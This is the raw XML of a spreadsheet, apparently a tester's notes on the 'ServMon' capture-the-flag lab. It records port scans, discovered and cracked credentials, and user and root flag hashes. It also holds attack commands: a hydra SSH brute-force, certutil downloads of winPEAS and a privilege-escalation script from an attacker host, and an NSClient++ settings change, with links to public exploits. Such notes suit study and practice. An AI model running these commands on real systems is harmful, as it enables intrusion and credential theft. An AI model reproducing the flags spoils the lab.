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2120CC9B-6EA5-4798-902E-A39B3F60BC48}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-135" yWindow="-16335" windowWidth="29070" windowHeight="15750" xr2:uid="{9AA4AFCA-69F3-4FD9-877C-89FBB0C8B483}"/>
  </bookViews>
  <sheets>
    <sheet name="Network" sheetId="1" r:id="rId1"/>
    <sheet name="Web App" sheetId="3" r:id="rId2"/>
    <sheet name="On host" sheetId="4" r:id="rId3"/>
    <sheet name="Commands" sheetId="2" r:id="rId4"/>
    <sheet name="Misc" sheetId="5" r:id="rId5"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm._FilterDatabase" localSheetId="0" hidden="1">Network!$A$1:$K$1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5" i="3" l="1"/>
  <c r="C5" i="3"/>
  <c r="C3" i="3"/>
  <c r="C4" i="3"/>
  <c r="C2" i="3"/>
  <c r="D3" i="3"/>
  <c r="D4" i="3"/>
  <c r="D2" i="3"/>
  <c r="E3" i="1"/>
  <c r="E4" i="1"/>
  <c r="E5" i="1"/>
  <c r="E6" i="1"/>
  <c r="E7" i="1"/>
  <c r="E8" i="1"/>
  <c r="E9" i="1"/>
  <c r="E10" i="1"/>
  <c r="E11" i="1"/>
  <c r="E12" i="1"/>
  <c r="E13" i="1"/>
  <c r="E14" i="1"/>
  <c r="E15" i="1"/>
  <c r="E16" i="1"/>
  <c r="E17" i="1"/>
  <c r="E2" i="1"/>
  <c r="F3" i="1"/>
  <c r="F4" i="1"/>
  <c r="F5" i="1"/>
  <c r="F6" i="1"/>
  <c r="F7" i="1"/>
  <c r="F8" i="1"/>
  <c r="F9" i="1"/>
  <c r="F10" i="1"/>
  <c r="F11" i="1"/>
  <c r="F12" i="1"/>
  <c r="F13" i="1"/>
  <c r="F14" i="1"/>
  <c r="F15" i="1"/>
  <c r="F16" i="1"/>
  <c r="F17" i="1"/>
  <c r="F2" i="1"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="168" uniqueCount="107">
  <si>
    <t>IP</t>
  </si>
  <si>
    <t>Hostname</t>
  </si>
  <si>
    <t>Port</t>
  </si>
  <si>
    <t>Protocol</t>
  </si>
  <si>
    <t>Service</t>
  </si>
  <si>
    <t>Notes</t>
  </si>
  <si>
    <t>Commands used</t>
  </si>
  <si>
    <t>Base URL</t>
  </si>
  <si>
    <t>Path</t>
  </si>
  <si>
    <t>Evidence</t>
  </si>
  <si>
    <t>Resources</t>
  </si>
  <si>
    <t>Host</t>
  </si>
  <si>
    <t>User</t>
  </si>
  <si>
    <t>Privileges</t>
  </si>
  <si>
    <t>Groups</t>
  </si>
  <si>
    <t>OS info</t>
  </si>
  <si>
    <t>Status</t>
  </si>
  <si>
    <t>Status + Path (from Kali)</t>
  </si>
  <si>
    <t>Port + Protocol</t>
  </si>
  <si>
    <t>#=LEFT($D2,FIND("/",$D2)-1)</t>
  </si>
  <si>
    <t>#=MID($D2,FIND("/",$D2)+1,LEN($D2))</t>
  </si>
  <si>
    <t>Files/Artifacts</t>
  </si>
  <si>
    <t>Misc</t>
  </si>
  <si>
    <t>80/tcp</t>
  </si>
  <si>
    <t>awk -F' - ' '{split($1,a," ");split($3,b,"  -&gt;");gsub(/^[ \t]+|[ \t]+$/,"",b[1]);print a[2],b[1]}' dirsearch_output.txt</t>
  </si>
  <si>
    <t xml:space="preserve">139/tcp                                                                                                                                                                                                                                     </t>
  </si>
  <si>
    <t xml:space="preserve">49669/tcp                                                                                                                                                                                                                                   </t>
  </si>
  <si>
    <t xml:space="preserve">22/tcp                                                                                                                                                                                                                                      </t>
  </si>
  <si>
    <t xml:space="preserve">49667/tcp                                                                                                                                                                                                                                   </t>
  </si>
  <si>
    <t xml:space="preserve">49664/tcp                                                                                                                                                                                                                                   </t>
  </si>
  <si>
    <t xml:space="preserve">49668/tcp                                                                                                                                                                                                                                   </t>
  </si>
  <si>
    <t xml:space="preserve">49670/tcp                                                                                                                                                                                                                                   </t>
  </si>
  <si>
    <t>135/tcp</t>
  </si>
  <si>
    <t>21/tcp</t>
  </si>
  <si>
    <t>6699/tcp</t>
  </si>
  <si>
    <t>6063/tcp</t>
  </si>
  <si>
    <t>49665/tcp</t>
  </si>
  <si>
    <t>49666/tcp</t>
  </si>
  <si>
    <t>8443/tcp</t>
  </si>
  <si>
    <t>445/tcp</t>
  </si>
  <si>
    <t>22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)</t>
  </si>
  <si>
    <t>80/tcp    open  http
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     &lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
|     &lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
|     &lt;head&gt;
|     &lt;title&gt;&lt;/title&gt;
|     &lt;script type="text/javascript"&gt;
|     window.location.href = "Pages/login.htm";
|     &lt;/script&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;/body&gt;
|     &lt;/html&gt;
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
|_http-title: Site doesn't have a title (text/html).</t>
  </si>
  <si>
    <t>135/tcp   open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</t>
  </si>
  <si>
    <t>445/tcp   open  microsoft-ds?</t>
  </si>
  <si>
    <t>6063/tcp  open  tcpwrapped</t>
  </si>
  <si>
    <t>6699/tcp  open  napster?</t>
  </si>
  <si>
    <t>49664/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49668/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49670/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49665/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49666/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49667/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49669/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Anonymous FTP login allowed</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> (FTP code 230)
|_02-28-22  07:35PM       &lt;DIR&gt;          Users
| ftp-syst: 
|_  SYST: Windows_NT</t>
    </r>
  </si>
  <si>
    <t>Windows 10 / Server 2019</t>
  </si>
  <si>
    <t>SERVMON.ServMon</t>
  </si>
  <si>
    <t>cat hosts /etc/hosts| sudo tee /etc/hosts | head -1</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">8443/tcp  open  ssl/https-alt
| http-methods: 
|_  Supported Methods: GET
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>| http-title: NSClient++</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
|_Requested resource was /index.html
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:   1d03:0c40:5b7a:0f6d:d8c8:78e3:cba7:38b4
|_SHA-1: 7083:bd82:b4b0:f9c0:cc9c:5019:2f9f:9291:4694:8334
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions, apple-iphoto, docker, hazelcast-http: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     5t5H
|     OC84rsdPZVB
|     workers
|     jobs
|   OfficeScan: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|     jobs
|   metasploit-msgrpc: 
|     HTTP/1.1 403
|     Content-Length: 20
|_    Your not allowed</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Nadine
Nathan
Passwords.txt 
admin:123456 - </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Doesn't work</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">2 users Nadine and Nathan.
Nadine left Nathan's </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Passwords.txt</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> file on desktop.
Nathan looks like an engineer:
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">TCP port 6699 is historically associated with the </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Napster/OpenNap</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> file-sharing protocol.</t>
    </r>
  </si>
  <si>
    <t>No anon access.</t>
  </si>
  <si>
    <t xml:space="preserve">wfuzz -c -f sub-fighter --hl 12  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://SERVMON.ServMon" -H "Host: FUZZ.SERVMON.ServMon" </t>
  </si>
  <si>
    <t xml:space="preserve">python3 dirsearch.py -u http://servmon.servmon -i 200-299,300-399 </t>
  </si>
  <si>
    <t>200 /%3f/</t>
  </si>
  <si>
    <t>200 /favicon.ico</t>
  </si>
  <si>
    <t>200 /index.htm</t>
  </si>
  <si>
    <t xml:space="preserve">200 /index.html    </t>
  </si>
  <si>
    <t>https://SERVMON.ServMon:8443</t>
  </si>
  <si>
    <t>http://SERVMON.ServMon:80</t>
  </si>
  <si>
    <t>https://www.exploit-db.com/exploits/47774</t>
  </si>
  <si>
    <t>1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">NVMS-1000 is a monitoring client specifically designed for network video surveillance. It allows you to control the video input signal devices such as cameras or domes, achieve live monitoring, video recording and backup by configuring the video parameters and viewing the live in the control panel. You can choose the menu to control the video surveillance system in the control panel.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Exploit works for directory traversal.</t>
    </r>
  </si>
  <si>
    <t>SSH into Nadine.</t>
  </si>
  <si>
    <t>nadine:L1k3B1gBut7s@W0rk</t>
  </si>
  <si>
    <t>user.txt: 6e553a492db86c2b8d3c6e8e50894d52</t>
  </si>
  <si>
    <t>nadine</t>
  </si>
  <si>
    <t>nadine@SERVMON C:\Users\Nadine\Desktop&gt;whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
nadine@SERVMON C:\Users\Nadine\Desktop&gt;whoami /all
USER INFORMATION
----------------
User Name      SID
============== =============================================
servmon\nadine S-1-5-21-3217154428-562821044-1828981534-1001
GROUP INFORMATION
-----------------
Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</t>
  </si>
  <si>
    <t>GROUP INFORMATION
-----------------
Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192</t>
  </si>
  <si>
    <t>AMD64</t>
  </si>
  <si>
    <t>echo %PROCESSOR_ARCHITECTURE%</t>
  </si>
  <si>
    <t>SET</t>
  </si>
  <si>
    <t>tree /f .</t>
  </si>
  <si>
    <t>https://www.exploit-db.com/exploits/46802</t>
  </si>
  <si>
    <t>password: ew2x6SsGTxjRwXOT</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">A simple, powerful, and secure monitoring agent for Windows and Linux. Works with Nagios, Icinga, Op5, Prometheus, check_mk — and anything that speaks NRPE, NSCA, NRDP, or REST.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Have to know if I have the right conditions for the exploit.</t>
    </r>
  </si>
  <si>
    <t>8443/tcp  open  ssl/https-alt
| http-methods: 
|_  Supported Methods: GET
| http-title: NSClient++
|_Requested resource was /index.html
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:   1d03:0c40:5b7a:0f6d:d8c8:78e3:cba7:38b4
|_SHA-1: 7083:bd82:b4b0:f9c0:cc9c:5019:2f9f:9291:4694:8334
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions, apple-iphoto, docker, hazelcast-http: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     5t5H
|     OC84rsdPZVB
|     workers
|     jobs
|   OfficeScan: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|     jobs
|   metasploit-msgrpc: 
|     HTTP/1.1 403
|     Content-Length: 20
|_    Your not allowed</t>
  </si>
  <si>
    <t>TCP</t>
  </si>
  <si>
    <t>Get-ChildItem -Recurse -File | Select-String "0.5.2.35" | Select-Object Filename, LineNumber, Line</t>
  </si>
  <si>
    <t>(Get-Item "nscp.exe").VersionInfo.FileVersion</t>
  </si>
  <si>
    <t>https://www.exploit-db.com/exploits/46802
https://docs.itrsgroup.com/docs/faq/op5/360020252193-op5-monitor-configure-nsclient-from-the-windows-command-prompt/index.html</t>
  </si>
  <si>
    <r>
      <t>Note that this app was seen from outside the box. I believe there is a</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> local privilege escalation path</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> here. Just need to check if the conditions are right.
Maybe I can log into local server. Port forwarding?
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">Ya version is 0.5.2.35.
</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">Nice just had to modify the settings via command line.
Okay weird the localhost can access it.
Need to reboot host. Messed up.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Got root, had to run exploit and reload the system.</t>
    </r>
  </si>
  <si>
    <t>password: ew2x6SsGTxjRwXOT
Version: 0.5.2.35
root.txt: ce9eff1b9a107b8e3292a853a26f9daa</t>
  </si>
  <si>
    <t>[victim IP]</t>
  </si>
  <si>
    <t>sudo masscan -pT:1-65535,U:1-65535 --rate=1000 -e tun0 [victim IP] &gt; raw_ports.txt</t>
  </si>
  <si>
    <t>sudo nmap -p$(cat raw_ports.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -un | tr '\n' ',' | sed 's/,$//') -sS -sV --version-all -sC -O -T3 -v [victim IP]</t>
  </si>
  <si>
    <t xml:space="preserve">ftp [victim IP] 21 </t>
  </si>
  <si>
    <t xml:space="preserve"> wget -m ftp://anonymous:anonymous@[victim IP]</t>
  </si>
  <si>
    <t>netexec smb [victim IP] --generate-hosts-file hosts</t>
  </si>
  <si>
    <t>netexec smb [victim IP] -u '' -p '' --shares</t>
  </si>
  <si>
    <t>netexec smb [victim IP] -u 'null' -p '' --shares</t>
  </si>
  <si>
    <t xml:space="preserve">hydra -l nadine -P passwords.txt ssh://[victim IP]  </t>
  </si>
  <si>
    <t>ssh -L 8443:127.0.0.1:8443 nadine@[victim IP]</t>
  </si>
  <si>
    <t>certutil -urlcache -split -f http://[attack IP]:8080/winPEASx64.exe winPEASx64.exe</t>
  </si>
  <si>
    <t>certutil -urlcache -split -f http://[attack IP]:8080/UnquotedServicePath.ps1 UnquotedServicePath.ps1</t>
  </si>
  <si>
    <t>C:\Program Files\NSClient++&gt;nscp settings --path /settings/default --key "allowed hosts" --set "127.0.0.1,[attack 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</si>
</sst>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2" fontId="4" fillId="0" borderId="0" xfId="0" applyNumberFormat="1"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xploit-db.com/exploits/46802" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.exploit-db.com/exploits/4777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exploit-db.com/exploits/4680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K28"/>
  <sheetViews>
    <sheetView tabSelected="1" zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="E1" sqref="E1"/>
      <selection pane="bottomLeft" activeCell="G27" sqref="G27"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="20.77734375" style="2" customWidth="1"/>
    <col min="2" max="2" width="29.109375" style="2" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="22.44140625" style="2" customWidth="1"/>
    <col min="4" max="4" width="15.109375" style="2" customWidth="1"/>
    <col min="5" max="5" width="10.33203125" style="2" customWidth="1"/>
    <col min="6" max="6" width="14.21875" style="2" customWidth="1"/>
    <col min="7" max="7" width="55" style="2" customWidth="1"/>
    <col min="8" max="8" width="62.44140625" style="2" customWidth="1"/>
    <col min="9" max="9" width="48.88671875" style="2" customWidth="1"/>
    <col min="10" max="10" width="47.44140625" style="2" customWidth="1"/>
    <col min="11" max="11" width="52.21875" style="2" customWidth="1"/>
    <col min="12" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>15</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>1</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>18</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>3</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>4</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>21</v>
      </c>
      <c r="J1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="2" t="s">
        <v>94</v>
      </c>
      <c r="B2" s="2" t="s">
        <v>55</v>
      </c>
      <c r="C2" s="2" t="s">
        <v>56</v>
      </c>
      <c r="D2" s="2" t="s">
        <v>25</v>
      </c>
      <c r="E2" s="6" t="str">
        <f>LEFT($D2,FIND("/",$D2)-1)</f>
        <v>139</v>
      </c>
      <c r="F2" s="7" t="str">
        <f>MID($D2,FIND("/",$D2)+1,LEN($D2))</f>
        <v xml:space="preserve">tcp                                                                                                                                                                                                                                     </v>
      </c>
      <c r="G2" s="2" t="s">
        <v>43</v>
      </c>
      <c r="I2" s="4"/>
      <c r="J2" s="5"/>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1" t="s">
        <v>94</v>
      </c>
      <c r="B3" s="2" t="s">
        <v>55</v>
      </c>
      <c r="C3" s="2" t="s">
        <v>56</v>
      </c>
      <c r="D3" s="2" t="s">
        <v>26</v>
      </c>
      <c r="E3" s="6" t="str">
        <f t="shared" ref="E3:E17" si="0">LEFT($D3,FIND("/",$D3)-1)</f>
        <v>49669</v>
      </c>
      <c r="F3" s="7" t="str">
        <f t="shared" ref="F3:F17" si="1">MID($D3,FIND("/",$D3)+1,LEN($D3))</f>
        <v xml:space="preserve">tcp                                                                                                                                                                                                                                   </v>
      </c>
      <c r="G3" s="2" t="s">
        <v>53</v>
      </c>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="2" t="s">
        <v>94</v>
      </c>
      <c r="B4" s="2" t="s">
        <v>55</v>
      </c>
      <c r="C4" s="2" t="s">
        <v>56</v>
      </c>
      <c r="D4" s="2" t="s">
        <v>27</v>
      </c>
      <c r="E4" s="6" t="str">
        <f t="shared" si="0"/>
        <v>22</v>
      </c>
      <c r="F4" s="7" t="str">
        <f t="shared" si="1"/>
        <v xml:space="preserve">tcp                                                                                                                                                                                                                                      </v>
      </c>
      <c r="G4" s="4" t="s">
        <v>40</v>
      </c>
      <c r="H4" s="4" t="s">
        <v>74</v>
      </c>
      <c r="I4" s="4" t="s">
        <v>75</v>
      </c>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="1" t="s">
        <v>94</v>
      </c>
      <c r="B5" s="2" t="s">
        <v>55</v>
      </c>
      <c r="C5" s="2" t="s">
        <v>56</v>
      </c>
      <c r="D5" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E5" s="6" t="str">
        <f t="shared" si="0"/>
        <v>49667</v>
      </c>
      <c r="F5" s="7" t="str">
        <f t="shared" si="1"/>
        <v xml:space="preserve">tcp                                                                                                                                                                                                                                   </v>
      </c>
      <c r="G5" s="2" t="s">
        <v>52</v>
      </c>
      <c r="J5" s="5"/>
    </row>
    <row r="6" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="2" t="s">
        <v>94</v>
      </c>
      <c r="B6" s="2" t="s">
        <v>55</v>
      </c>
      <c r="C6" s="2" t="s">
        <v>56</v>
      </c>
      <c r="D6" s="2" t="s">
        <v>29</v>
      </c>
      <c r="E6" s="6" t="str">
        <f t="shared" si="0"/>
        <v>49664</v>
      </c>
      <c r="F6" s="7" t="str">
        <f t="shared" si="1"/>
        <v xml:space="preserve">tcp                                                                                                                                                                                                                                   </v>
      </c>
      <c r="G6" s="2" t="s">
        <v>47</v>
      </c>
      <c r="H6" s="4"/>
      <c r="J6" s="5"/>
    </row>
    <row r="7" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="1" t="s">
        <v>94</v>
      </c>
      <c r="B7" s="2" t="s">
        <v>55</v>
      </c>
      <c r="C7" s="2" t="s">
        <v>56</v>
      </c>
      <c r="D7" s="2" t="s">
        <v>30</v>
      </c>
      <c r="E7" s="6" t="str">
        <f t="shared" si="0"/>
        <v>49668</v>
      </c>
      <c r="F7" s="7" t="str">
        <f t="shared" si="1"/>
        <v xml:space="preserve">tcp                                                                                                                                                                                                                                   </v>
      </c>
      <c r="G7" s="2" t="s">
        <v>48</v>
      </c>
      <c r="J7" s="5"/>
    </row>
    <row r="8" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="2" t="s">
        <v>94</v>
      </c>
      <c r="B8" s="2" t="s">
        <v>55</v>
      </c>
      <c r="C8" s="2" t="s">
        <v>56</v>
      </c>
      <c r="D8" s="2" t="s">
        <v>31</v>
      </c>
      <c r="E8" s="6" t="str">
        <f t="shared" si="0"/>
        <v>49670</v>
      </c>
      <c r="F8" s="7" t="str">
        <f t="shared" si="1"/>
        <v xml:space="preserve">tcp                                                                                                                                                                                                                                   </v>
      </c>
      <c r="G8" s="2" t="s">
        <v>49</v>
      </c>
    </row>
    <row r="9" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="1" t="s">
        <v>94</v>
      </c>
      <c r="B9" s="2" t="s">
        <v>55</v>
      </c>
      <c r="C9" s="2" t="s">
        <v>56</v>
      </c>
      <c r="D9" s="2" t="s">
        <v>32</v>
      </c>
      <c r="E9" s="6" t="str">
        <f t="shared" si="0"/>
        <v>135</v>
      </c>
      <c r="F9" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G9" s="2" t="s">
        <v>42</v>
      </c>
    </row>
    <row r="10" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="2" t="s">
        <v>94</v>
      </c>
      <c r="B10" s="2" t="s">
        <v>55</v>
      </c>
      <c r="C10" s="2" t="s">
        <v>56</v>
      </c>
      <c r="D10" s="2" t="s">
        <v>33</v>
      </c>
      <c r="E10" s="6" t="str">
        <f t="shared" si="0"/>
        <v>21</v>
      </c>
      <c r="F10" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G10" s="2" t="s">
        <v>54</v>
      </c>
      <c r="H10" s="2" t="s">
        <v>60</v>
      </c>
